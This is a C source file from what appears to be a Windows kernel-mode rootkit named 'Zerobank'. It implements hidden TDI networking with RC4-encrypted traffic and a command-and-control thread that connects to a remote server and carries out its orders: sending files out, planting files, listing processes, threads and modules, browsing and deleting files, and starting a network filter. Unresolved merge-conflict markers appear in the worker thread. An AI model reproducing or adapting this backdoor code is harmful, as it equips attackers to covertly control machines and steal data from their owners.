#include "common.h"

/*//////////////////////////////////////////////////
												////
	File: Net.c									////
												////
	Implementation of all network operations	////
	- create address							////
	- create connection object					////
	- server connection							////
	- sending / receive							////
	- disassociate address						////
	- closing socket							////
												////
	Implementation of communication_thread		////
	(SystemThread) since thread will be			////
	executing for long periods of time,			////
	otherwise a WorkItem would be the logic		////
	option										////
												////
*///////////////////////////////////////////////////

TDI_STATUS tdi_completion_routine(IN PDEVICE_OBJECT deviceobject, IN PIRP Irp, IN PVOID context)
{
	if (context != NULL)
	{
		g_Hash._KeSetEvent((PKEVENT)context, 0, FALSE);
	}

	return STATUS_MORE_PROCESSING_REQUIRED;
}

TDI_STATUS create_connection(IN PHANDLE Handle, IN PFILE_OBJECT **socket, IN PROOTKIT_API_HASH Hash)
{
	NTSTATUS st = STATUS_UNSUCCESSFUL;
	OBJECT_ATTRIBUTES oa;
	ULONG ubuffer;
	IO_STATUS_BLOCK io;
	CHAR EA_Buffer[sizeof(FILE_FULL_EA_INFORMATION) + TDI_TRANSPORT_ADDRESS_LENGTH + sizeof(TA_IP_ADDRESS)];
	PFILE_FULL_EA_INFORMATION	pEA_Buffer = (PFILE_FULL_EA_INFORMATION)EA_Buffer;
	CONNECTION_CONTEXT			contextplaceholder = NULL;
	UNICODE_STRING tcpip = { 0 };
	SIZE_T ByteChecker = 0;
	Hash->_RtlInitUnicodeString(&tcpip, L"\\Device\\Tcp");

	ubuffer = FIELD_OFFSET(FILE_FULL_EA_INFORMATION, EaName) + TDI_CONNECTION_CONTEXT_LENGTH + 1 + sizeof(CONNECTION_CONTEXT);
	pEA_Buffer = (PFILE_FULL_EA_INFORMATION)Hash->_ExAllocatePool(NonPagedPool, ubuffer);
	if (pEA_Buffer == NULL)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	memset(pEA_Buffer, 0, ubuffer);
	pEA_Buffer->NextEntryOffset = 0;
	pEA_Buffer->Flags = 0;
	pEA_Buffer->EaNameLength = TDI_CONNECTION_CONTEXT_LENGTH;

	kimemcpy(pEA_Buffer->EaName, TdiConnectionContext, pEA_Buffer->EaNameLength + 1);

	pEA_Buffer->EaValueLength = sizeof(CONNECTION_CONTEXT);
	*(CONNECTION_CONTEXT*)(pEA_Buffer->EaName + (pEA_Buffer->EaNameLength + 1)) = (CONNECTION_CONTEXT)contextplaceholder;

	InitializeObjectAttributes(&oa, &tcpip, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

#ifndef _WIN64 && WINVER == _WIN32_WINNT_WIN7
	st = MyIopCreateFile(Handle,
		FILE_GENERIC_READ |
		FILE_GENERIC_WRITE |
		SYNCHRONIZE,
		&oa,
		&io,
		0,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ,
		FILE_OPEN,
		0,
		pEA_Buffer,
		sizeof(EA_Buffer),
		CreateFileTypeNone,
		NULL,
		IO_NO_PARAMETER_CHECKING,
		0,
		NULL);

#else

	st = IoCreateFileEx(Handle, FILE_GENERIC_READ | FILE_GENERIC_WRITE | SYNCHRONIZE, &oa, &io, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN,
		FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, pEA_Buffer, sizeof(EA_Buffer), CreateFileTypeNone, NULL, IO_NO_PARAMETER_CHECKING, 0, NULL);

#endif


	if (NT_SUCCESS(st))
	{
		st = Hash->_ObReferenceObjectByHandle(*Handle,
			FILE_GENERIC_READ, 
			NULL, 
			KernelMode, 
			(PVOID*)*socket, 
			NULL);
		if (NT_SUCCESS(st))
			st = STATUS_SUCCESS;

	}
	return st;
}

TDI_STATUS create_address(IN PHANDLE *Handle, IN PFILE_OBJECT *socket, IN PROOTKIT_API_HASH Hash)
{
	NTSTATUS st = STATUS_UNSUCCESSFUL;
	OBJECT_ATTRIBUTES TDIObjectAttributes = { 0 };
	IO_STATUS_BLOCK io;
	PTA_IP_ADDRESS ipaddress;
	CHAR EABuffer[sizeof(FILE_FULL_EA_INFORMATION) + TDI_TRANSPORT_ADDRESS_LENGTH + sizeof(TA_IP_ADDRESS)];	// Fill the Extended Attributes Buffer
	PFILE_FULL_EA_INFORMATION pEABuffer = (PFILE_FULL_EA_INFORMATION)EABuffer;								// Define the pointer
	UNICODE_STRING tcpip = { 0 };
	SIZE_T ByteChecker = 0;

	Hash->_RtlInitUnicodeString(&tcpip, L"\\Device\\Tcp");
	InitializeObjectAttributes(&TDIObjectAttributes, &tcpip, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

	pEABuffer->NextEntryOffset = 0;
	pEABuffer->Flags = 0;
	pEABuffer->EaNameLength = TDI_TRANSPORT_ADDRESS_LENGTH;

	kimemcpy(pEABuffer->EaName, TdiTransportAddress, pEABuffer->EaNameLength + 1);

	pEABuffer->EaValueLength = sizeof(TA_IP_ADDRESS);

	ipaddress = (PTA_IP_ADDRESS)(pEABuffer->EaName + pEABuffer->EaNameLength + 1);
	ipaddress->TAAddressCount = 1;																// Number of Addresses, only one
	ipaddress->Address[0].AddressLength = TDI_ADDRESS_LENGTH_IP;								// length
	ipaddress->Address[0].AddressType = TDI_ADDRESS_TYPE_IP;									// type of address
	ipaddress->Address[0].Address[0].sin_port = 0;											// define 0 for both port and Ip address
	ipaddress->Address[0].Address[0].in_addr = 0;

	memset(ipaddress->Address[0].Address[0].sin_zero, 0, sizeof(ipaddress->Address[0].Address[0].sin_zero));


#ifndef _WIN64 && WINVER == _WIN32_WINNT_WIN7
	
	st = MyIopCreateFile(*Handle,
		FILE_GENERIC_READ |
		FILE_GENERIC_WRITE |
		SYNCHRONIZE,
		&TDIObjectAttributes,
		&io,
		0,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ,
		FILE_OPEN,
		0,
		pEABuffer,
		sizeof(EABuffer),
		CreateFileTypeNone,
		NULL,
		IO_NO_PARAMETER_CHECKING,
		0,
		NULL);
#else

	st = IoCreateFileEx(*Handle, FILE_GENERIC_READ | FILE_GENERIC_WRITE | SYNCHRONIZE, &TDIObjectAttributes, &io, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN,
		FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, pEABuffer, sizeof(EABuffer), CreateFileTypeNone, NULL, IO_NO_PARAMETER_CHECKING, 0, NULL);

#endif

	if (NT_SUCCESS(st))
	{
		st = Hash->_ObReferenceObjectByHandle(**Handle,
			FILE_ANY_ACCESS, 
			0, 
			KernelMode, 
			(PVOID*)socket, 
			NULL);
		if (NT_SUCCESS(st))
			st = STATUS_SUCCESS;
	}

	return st;
}

TDI_STATUS bind(IN PHANDLE Handle, IN PFILE_OBJECT *socket, IN PROOTKIT_API_HASH Hash)
{
	NTSTATUS st = STATUS_UNSUCCESSFUL;
	HANDLE objecthandle;
	KEVENT Event;
	PIRP Irp;
	PFILE_OBJECT AddressObject;
	IO_STATUS_BLOCK io;
	PDEVICE_OBJECT SocketObject = NULL;
	PTDI_REQUEST_KERNEL_ASSOCIATE p;
	PIO_STACK_LOCATION pio;

	st = create_address(&Handle, &AddressObject, Hash);
	if (NT_ERROR(st))
		return STATUS_UNSUCCESSFUL;

	st = create_connection(&objecthandle, &socket, Hash);
	if (NT_ERROR(st))
		return STATUS_UNSUCCESSFUL;


	SocketObject = Hash->_IoGetRelatedDeviceObject(AddressObject);
	if (!SocketObject || Hash->_MmIsAddressValid(SocketObject) == FALSE)
		return STATUS_UNSUCCESSFUL;


	Hash->_KeInitializeEvent(&Event, NotificationEvent, FALSE);

	Irp = Hash->_IoBuildDeviceIoControlRequest(IOCTL_TDI_ASSOCIATE_ADDRESS, SocketObject, NULL, 0, NULL, 0, TRUE, &Event, &io);
	if (Irp == NULL)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	pio = Irp->Tail.Overlay.CurrentStackLocation - 1;
	pio->MajorFunction = IRP_MJ_INTERNAL_DEVICE_CONTROL;
	pio->MinorFunction = TDI_ASSOCIATE_ADDRESS;
	pio->DeviceObject = SocketObject;
	pio->FileObject = *socket;
	p = (PTDI_REQUEST_KERNEL_ASSOCIATE)&pio->Parameters;
	p->AddressHandle = (HANDLE)(*Handle);

	IoSetCompletionRoutine(Irp, tdi_completion_routine, &Event, TRUE, TRUE, TRUE);

	st = Hash->_IofCallDriver(SocketObject, Irp);
	if (st == STATUS_PENDING)
	{
		st = Hash->_KeWaitForSingleObject(&Event, Executive, KernelMode, FALSE, NULL);
		st = io.Status;
	}

	return st == STATUS_SUCCESS ? io.Status : st;
}

INT send(IN PFILE_OBJECT socket, IN PCHAR data, IN unsigned long datasize)
{
	NTSTATUS st = STATUS_SUCCESS;
	PMDL Mdl;
	PIRP Irp;
	KEVENT Event;
	IO_STATUS_BLOCK io = { 0 };
	PDEVICE_OBJECT deviceobject = NULL;
	PCHAR SendBuffer = NULL;
	INT returnedbytes = 0;
	PTDI_REQUEST_KERNEL_SEND p;
	PIO_STACK_LOCATION pio;

	SendBuffer = (PCHAR)g_Hash._ExAllocatePool(NonPagedPool, datasize);
	kimemcpy(SendBuffer, data, datasize);

	deviceobject = g_Hash._IoGetRelatedDeviceObject(socket);

	g_Hash._KeInitializeEvent(&Event, NotificationEvent, FALSE);

	Irp = g_Hash._IoBuildDeviceIoControlRequest(IOCTL_TDI_SEND, deviceobject, NULL, 0, NULL, 0, TRUE, &Event, &io);
	if (Irp == NULL)
		return STATUS_INSUFFICIENT_RESOURCES;


	Mdl = g_Hash._IoAllocateMdl(SendBuffer, datasize, FALSE, FALSE, Irp);
	if (Mdl == NULL)
	{
		g_Hash._IoFreeMdl(Mdl);
		return STATUS_INSUFFICIENT_RESOURCES;
	}
	__try
	{
		g_Hash._MmProbeAndLockPages(Mdl, KernelMode, IoModifyAccess);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		g_Hash._IoFreeMdl(Mdl);
		g_Hash._IoFreeIrp(Irp);
		return STATUS_UNSUCCESSFUL;
	}


	pio = Irp->Tail.Overlay.CurrentStackLocation - 1;
	pio->MajorFunction = IRP_MJ_INTERNAL_DEVICE_CONTROL;
	pio->MinorFunction = TDI_SEND;
	pio->DeviceObject = deviceobject;
	pio->FileObject = socket;
	
	p = (PTDI_REQUEST_KERNEL_SEND)&pio->Parameters;
	p->SendFlags = 0;
	p->SendLength = datasize;
	Irp->MdlAddress = Mdl;


	IoSetCompletionRoutine(Irp,tdi_completion_routine, &Event, TRUE, TRUE, TRUE);

	st = g_Hash._IofCallDriver(deviceobject, Irp);
	if (st == STATUS_PENDING)
	{
		st = g_Hash._KeWaitForSingleObject(&Event, Executive, KernelMode, FALSE, NULL);
		st = io.Status;
	}

	returnedbytes = kistrlen(data);

	return returnedbytes;

}


INT tdi_send_crypted(IN PFILE_OBJECT socket, IN INT keytype, IN PVOID Data, IN ULONG Size, OUT PULONG SizeSent OPTIONAL)
{
	rc4_ctx ctx = { 0 };
	INT sendsize = 0;
	PVOID encryptbuffer = NULL;

	encryptbuffer = g_Hash._ExAllocatePool(NonPagedPool, Size);
	if (encryptbuffer == NULL)
		return 1;

	memset(encryptbuffer, 0, Size);

	switch (keytype)
	{
	case RC4_KEY_1:
		rc4_init(&ctx, key1, sizeof(key1));
		break;
	case RC4_KEY_2:
		rc4_init(&ctx, key2, sizeof(key2));
		break;
	case RC4_KEY_3:
		rc4_init(&ctx, key3, sizeof(key3));
		break;
	default:
		break;
	}

	rc4_encrypt(&ctx, (const uint8*)Data, (uint8*)encryptbuffer, Size);

	sendsize = send(socket, (char*)encryptbuffer, Size);
	if (sendsize <= 0)
		return 1;

	if (ARGUMENT_PRESENT(SizeSent))
		*SizeSent = Size;


	g_Hash._ExFreePoolWithTag(encryptbuffer,0);
	encryptbuffer = NULL;

	return sendsize;
}

TDI_STATUS connect(IN PFILE_OBJECT *socket, IN unsigned short port, IN unsigned long oct1, IN unsigned long oct2, IN unsigned long oct3, IN unsigned long oct4, IN PROOTKIT_API_HASH Hash)
{
	NTSTATUS st;
	PIRP Irp;
	TA_IP_ADDRESS ipaddress;
	USHORT Port;
	ULONG Ip;
	KEVENT Event;
	IO_STATUS_BLOCK io;
	TDI_CONNECTION_INFORMATION connectinfo;
	PDEVICE_OBJECT DeviceObject = NULL;
	PTDI_REQUEST_KERNEL p;
	PIO_STACK_LOCATION pio;

	DeviceObject = Hash->_IoGetRelatedDeviceObject(*socket);

	Hash->_KeInitializeEvent(&Event, NotificationEvent,FALSE);

	Irp = Hash->_IoBuildDeviceIoControlRequest(IOCTL_TDI_CONNECT, DeviceObject, NULL, 0, NULL, 0, TRUE, &Event, &io);
	if (Irp == NULL)
		return STATUS_INSUFFICIENT_RESOURCES;

	Port = HTONS(port);
	Ip = INETADDR(oct1, oct2, oct3, oct4);

	ipaddress.TAAddressCount = 1;
	ipaddress.Address[0].AddressLength = TDI_ADDRESS_LENGTH_IP;
	ipaddress.Address[0].AddressType = TDI_ADDRESS_TYPE_IP;
	ipaddress.Address[0].Address[0].sin_port = Port;
	ipaddress.Address[0].Address[0].in_addr = Ip;

	connectinfo.UserDataLength = 0;
	connectinfo.UserData = 0;
	connectinfo.OptionsLength = 0;
	connectinfo.Options = 0;
	connectinfo.RemoteAddressLength = sizeof(ipaddress);
	connectinfo.RemoteAddress = &ipaddress;

	pio = Irp->Tail.Overlay.CurrentStackLocation - 1;
	pio->MajorFunction = IRP_MJ_INTERNAL_DEVICE_CONTROL;
	pio->MinorFunction = TDI_CONNECT;
	pio->DeviceObject = DeviceObject;
	pio->FileObject = *socket;
	p = (PTDI_REQUEST_KERNEL)&pio->Parameters;
	p->RequestConnectionInformation = &connectinfo;
	p->ReturnConnectionInformation = NULL;
	p->RequestFlags = NULL;
	p->RequestSpecific = NULL;

	IoSetCompletionRoutine(Irp,tdi_completion_routine, &Event, TRUE, TRUE, TRUE);

	st = Hash->_IofCallDriver(DeviceObject, Irp);
	if (st == STATUS_PENDING)
	{
		Hash->_KeWaitForSingleObject(&Event, Executive, KernelMode,FALSE, NULL);
		st = io.Status;
	}

	return st == STATUS_SUCCESS ? io.Status : st;
}

INT recv(IN PFILE_OBJECT socket, IN PCHAR data, IN unsigned long datasize)
{
	NTSTATUS st;
	KEVENT Event;
	PIRP Irp;
	PDEVICE_OBJECT DeviceObject = NULL;
	IO_STATUS_BLOCK io;
	PMDL Mdl;
	INT Bytes = 0;
	PTDI_REQUEST_KERNEL_RECEIVE p;
	PIO_STACK_LOCATION pio;

	DeviceObject = g_Hash._IoGetRelatedDeviceObject(socket);

	g_Hash._KeInitializeEvent(&Event, NotificationEvent,FALSE);

	Irp = g_Hash._IoBuildDeviceIoControlRequest(IOCTL_TDI_RECEIVE, DeviceObject, NULL, 0, NULL, 0, TRUE, &Event, &io);
	if (Irp == NULL)
		return STATUS_INSUFFICIENT_RESOURCES;

	Mdl = g_Hash._IoAllocateMdl(data, datasize, FALSE, FALSE, Irp);
	if (Mdl == NULL)
	{
		g_Hash._IoFreeMdl(Mdl);
		return STATUS_INSUFFICIENT_RESOURCES;
	}
	__try {
		g_Hash._MmProbeAndLockPages(Mdl, KernelMode, IoModifyAccess);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		g_Hash._IoFreeIrp(Irp);
		g_Hash._IoFreeMdl(Mdl);
		return STATUS_UNSUCCESSFUL;
	}

	pio = Irp->Tail.Overlay.CurrentStackLocation - 1;
	pio->MajorFunction = IRP_MJ_INTERNAL_DEVICE_CONTROL;
	pio->MinorFunction = TDI_RECEIVE;
	pio->DeviceObject = DeviceObject;
	pio->FileObject = socket;

	p = (PTDI_REQUEST_KERNEL_RECEIVE)&pio->Parameters;
	p->ReceiveFlags = TDI_RECEIVE_NORMAL;
	p->ReceiveLength = datasize;
	Irp->MdlAddress = Mdl;
	
	IoSetCompletionRoutine(Irp, tdi_completion_routine, &Event, TRUE, TRUE, TRUE);
	st = g_Hash._IofCallDriver(DeviceObject, Irp);
	if (st == STATUS_PENDING) {
		st = g_Hash._KeWaitForSingleObject(&Event, Executive, KernelMode, FALSE, NULL);
		st = io.Status;
	}

	Bytes = kistrlen(data);

	return Bytes;
}

INT tdi_recv_decrypted(IN PFILE_OBJECT socket, IN INT keytype, IN PVOID Data, IN ULONG Size, OUT PULONG SizeRecv OPTIONAL)
{
	rc4_ctx ctx = { 0 };
	INT recvsize = 0;

	switch (keytype)
	{
	case RC4_KEY_1:
		rc4_init(&ctx, key1, sizeof(key1));
		break;
	case RC4_KEY_2:
		rc4_init(&ctx, key2, sizeof(key2));
		break;
	case RC4_KEY_3:
		rc4_init(&ctx, key3, sizeof(key3));
		break;
	default:
		break;
	}

	recvsize = recv(socket, (char*)Data, Size);
	if (recvsize <= 0)
		return 1;

	rc4_decrypt(&ctx, (const uint8*)Data, (uint8*)Data, Size);
	
	if (ARGUMENT_PRESENT(SizeRecv))
		*SizeRecv = Size;


	return recvsize;

}

TDI_STATUS destroy_connection_address(IN PFILE_OBJECT socket, IN PROOTKIT_API_HASH Hash)
{
	NTSTATUS st;
	PIRP Irp;
	KEVENT Event;
	IO_STATUS_BLOCK io;
	PDEVICE_OBJECT DeviceObject = NULL;
	PTDI_REQUEST_KERNEL_DISASSOCIATE p;
	PIO_STACK_LOCATION pio;

	DeviceObject = Hash->_IoGetRelatedDeviceObject(socket);

	Hash->_KeInitializeEvent(&Event, NotificationEvent, FALSE);

	Irp = Hash->_IoBuildDeviceIoControlRequest(IOCTL_TDI_DISASSOCIATE_ADDRESS, DeviceObject, NULL, 0, NULL, 0, TRUE, &Event, &io);
	if (Irp == NULL)
		return STATUS_INSUFFICIENT_RESOURCES;

	pio = Irp->Tail.Overlay.CurrentStackLocation - 1;
	pio->MajorFunction = IRP_MJ_INTERNAL_DEVICE_CONTROL;
	pio->MinorFunction = TDI_DISASSOCIATE_ADDRESS;
	pio->DeviceObject = DeviceObject;
	pio->FileObject = socket;
	p = (PTDI_REQUEST_KERNEL_DISASSOCIATE)&pio->Parameters;
	p->RequestConnectionInformation = NULL;
	p->ReturnConnectionInformation = NULL;

	IoSetCompletionRoutine(Irp,tdi_completion_routine, &Event, TRUE, TRUE, TRUE);

	st = Hash->_IofCallDriver(DeviceObject, Irp);
	if (st == STATUS_PENDING) {
		st = Hash->_KeWaitForSingleObject(&Event, Executive, KernelMode, FALSE, NULL);
		st = io.Status;
	}

	return st == STATUS_SUCCESS ? io.Status : st;

}

TDI_STATUS closesocket(IN PFILE_OBJECT socket, IN PROOTKIT_API_HASH Hash)
{
	NTSTATUS st;
	PIRP Irp;
	KEVENT Event;
	IO_STATUS_BLOCK io;
	PDEVICE_OBJECT DeviceObject = NULL;
	PTDI_REQUEST_KERNEL_DISCONNECT p;
	PIO_STACK_LOCATION pio;

	DeviceObject = Hash->_IoGetRelatedDeviceObject(socket);

	Hash->_KeInitializeEvent(&Event, NotificationEvent, FALSE);

	Irp = Hash->_IoBuildDeviceIoControlRequest(IOCTL_TDI_DISCONNECT, DeviceObject, NULL, 0, NULL, 0, TRUE, &Event, &io);
	if (Irp == NULL)
		return STATUS_INSUFFICIENT_RESOURCES;

	pio = Irp->Tail.Overlay.CurrentStackLocation - 1;
	pio->MajorFunction = IRP_MJ_INTERNAL_DEVICE_CONTROL;
	pio->MinorFunction = TDI_DISCONNECT;
	pio->DeviceObject = DeviceObject;
	pio->FileObject = socket;
	p = (PTDI_REQUEST_KERNEL_DISCONNECT)&pio->Parameters;
	p->RequestConnectionInformation = NULL;
	p->ReturnConnectionInformation = NULL;

	IoSetCompletionRoutine(Irp,tdi_completion_routine, &Event, TRUE, TRUE, TRUE);

	st = Hash->_IofCallDriver(DeviceObject, Irp);
	if (st == STATUS_PENDING) {
		st = Hash->_KeWaitForSingleObject(&Event, Executive, KernelMode, FALSE, NULL);
		st = io.Status;
	}

	return st == STATUS_SUCCESS ? io.Status : st;
}


VOID zerobank_communication_worker_thread(PVOID Context)
{
	NTSTATUS st;
	HANDLE socket_handle = NULL;
	PFILE_OBJECT socket = NULL;
	PZEROBANK_PACKET_TYPE packet = NULL;
	PZEROBANK_COMMUNICATION_CTX g_ctx = NULL;
	PZEROBANK_TDI_FILTER tdi = NULL;
	LARGE_INTEGER large = { 0 };
	INT sendsize = 0;
	INT recvsize = 0;
	g_ctx = (PZEROBANK_COMMUNICATION_CTX)Context;

	// bind the socket

	bind(&socket_handle, &socket, g_ctx->g_Hash);

	// connect to the remote server

	connect(&socket, 443, 192, 168, 1, 36, g_ctx->g_Hash);

	// send crypted bot-header, if for some reason sending
<<<<<<< HEAD
	// the header fails, theres no point in keep going, so
	// we return unsuccessful status
=======
	// the header fails, theres no point in keep going
>>>>>>> adding files

	if (zerobank_bot_header(socket, g_ctx->g_Hash) == FALSE)
		return;

	// Alloc memory for TDI filter plugin

	tdi = (PZEROBANK_TDI_FILTER)g_ctx->g_Hash->_ExAllocatePool(NonPagedPool, sizeof(ZEROBANK_TDI_FILTER));
	memset(tdi, 0, sizeof(ZEROBANK_TDI_FILTER));

	// Init command parsing between driver & remote server

	large.QuadPart = -20 * 1000 * 10;

	// while the thread is active keep looping forever

	while (!g_ctx->Stop)
	{
		g_ctx->g_Hash->_KeWaitForSingleObject(&g_ctx->Event, Executive, KernelMode, FALSE, &large);

		packet = (PZEROBANK_PACKET_TYPE)g_ctx->g_Hash->_ExAllocatePool(NonPagedPool, sizeof(ZEROBANK_PACKET_TYPE));
		memset(packet, 0, sizeof(ZEROBANK_PACKET_TYPE));
		
		// Process the received buffer and decrypt it

		recvsize = tdi_recv_decrypted(socket, RC4_KEY_2,(char*)packet,sizeof(ZEROBANK_PACKET_TYPE),0);
		if (recvsize <= 0)
			KdPrint(("\r\nError receiving user-mode packet"));

		switch (packet->PacketType)
		{
		case ZB_INJECT:
			KdPrint(("\r\n__STATUS_NOT_IMPLEMENTED__"));
			break;
		case ZB_KERNEL_TO_USER_TRANSFER:
			KdPrint(("\r\n__rootkit__kernel_to_user__transfer plugin selected"));

			rk_send_file_to_userspace(packet->FileName_For_File_Transfer, socket, g_ctx->g_Hash);

			break;
		case ZB_USER_TO_KERNEL_TRANSFER:
			KdPrint(("\r\n__rootkit__user_to_kernel__transfer plugin selected"));

			rk_store_file_from_userspace(socket, g_ctx->g_Hash);

			break;
		case ZB_LOAD_DRIVER:
			KdPrint(("\r\n__STATUS_NOT_IMPLEMENETED"));
			break;
		case ZB_DISCONNECT:
			KdPrint(("\r\n__rootkit__disconnect__ plugin selected"));

			destroy_connection_address(socket, g_ctx->g_Hash);
			closesocket(socket, g_ctx->g_Hash);
#ifndef _WIN64
			ObpCloseHandle(socket_handle, KernelMode);
#else
			ZwClose(socket_handle);
#endif
			g_ctx->g_Hash->_ObfDereferenceObject(socket);
			g_ctx->Stop = TRUE;

			break;
		case ZB_EPROCESS:
			KdPrint(("\r\n__rootkit_eprocess__ plugin selected"));

			rk_send_process_to_userspace(socket, g_ctx->g_Hash);

			break;
		case ZB_ETHREAD:
			KdPrint(("\r\n__rootkit_ethread__ plugin selected"));

			rk_send_threads_to_userspace(packet->ProcessId_For_ETHREAD_plugin, socket, g_ctx->g_Hash);

			break;
		case ZB_MODULES:
			KdPrint(("\r\n__rootkit_modules__ plugin selected"));

			rk_send_modules_to_userspace(socket, g_ctx->g_Hash);

			break;
		case ZB_FILE_EXPLORER:
			KdPrint(("\r\n__rootkit_file_explorer__ plugin selected"));

			rk_send_fileexplorer_to_userspace(socket, packet->FileName_For_FileExplorer_plugin, g_ctx->g_Hash);

			break;
		case ZB_DELETE_FILE:
			KdPrint(("\r\n__rootkit_delete_file__ plugin selected"));

			IopDeleteFile(socket, packet->FileName_For_File_Deletion);

			break;
		case ZB_INTERNAL_SYSTEM_INFORMATION:
			KdPrint(("\r\n__rootkit_internal_sys_information plugin selected"));

			rk_send_sys_information_to_userspace(socket, g_ctx->g_Hash);

			break;
		case ZB_START_TDI_FILTER:
			KdPrint(("\r\n__rootkit__start__tdi__filter plugin selected"));

<<<<<<< HEAD
=======
			// pass parameters to tdi struct
			// and start TDI filter thread

>>>>>>> adding files
			tdi->Hash = g_ctx->g_Hash;
			tdi->pDriverObject = g_ctx->pDriverObjectCtx;

			st = g_rk_start_TDI_filter(tdi);
			

			break;
		case ZB_STOP_TDI_FILTER:
			KdPrint(("\r\n__rootkit__stop__tdi__filter plugin selected"));

<<<<<<< HEAD
			tdi->Stop = TRUE;
			tdi->Hash->_KeSetEvent(&tdi->Event, 0, FALSE);
			tdi->Hash->_KeWaitForSingleObject(tdi->Ethread, Executive, KernelMode, FALSE, NULL);
			tdi->Hash->_ObfDereferenceObject(tdi->Ethread);

			IoDetachDevice((PDEVICE_OBJECT)g_ctx->pDriverObjectCtx->DeviceObject->DeviceExtension);
=======
			// set stop variable to true, set event and wait 

			tdi->Stop = TRUE;
			tdi->Hash->_KeSetEvent(&tdi->Event, 0, FALSE);
			tdi->Hash->_KeWaitForSingleObject(tdi->Ethread, Executive, KernelMode, FALSE, NULL);
			
			// dereference object

			tdi->Hash->_ObfDereferenceObject(tdi->Ethread);

			// detach device from Tcp

			IoDetachDevice((PDEVICE_OBJECT)g_ctx->pDriverObjectCtx->DeviceObject->DeviceExtension);
			
			// delete device and clean up

>>>>>>> adding files
			IoDeleteDevice(g_ctx->pDriverObjectCtx->DeviceObject);

			break;
		default:
			KdPrint(("\r\n__Invalid__option selected"));
			break;

		}

		g_ctx->g_Hash->_ExFreePoolWithTag(packet,0);

	}

	g_ctx->g_Hash->_ObfDereferenceObject(g_ctx->Ethread);
	g_ctx->g_Hash->_PsTerminateSystemThread(STATUS_SUCCESS);

}

NTSTATUS zerobank_init_communication_thread(OUT PZEROBANK_COMMUNICATION_CTX Context)
{
	NTSTATUS st;
	HANDLE Thread;

	Context->g_Hash->_KeInitializeEvent(&Context->Event, SynchronizationEvent, FALSE);
	Context->Stop = FALSE;

	KiInitializeKernelModeThread(&Thread, Context->g_Hash, zerobank_communication_worker_thread, (PVOID)Context);

	st =Context->g_Hash->_ObReferenceObjectByHandle(Thread, THREAD_ALL_ACCESS, *PsThreadType, KernelMode, (PVOID*)&Context->Ethread, NULL);
	
	ZwClose(Thread);

	if (!NT_SUCCESS(st)) {
		Context->Stop = TRUE;
		Context->g_Hash->_KeSetEvent(&Context->Event, 0, FALSE);
	}

	return st;
}
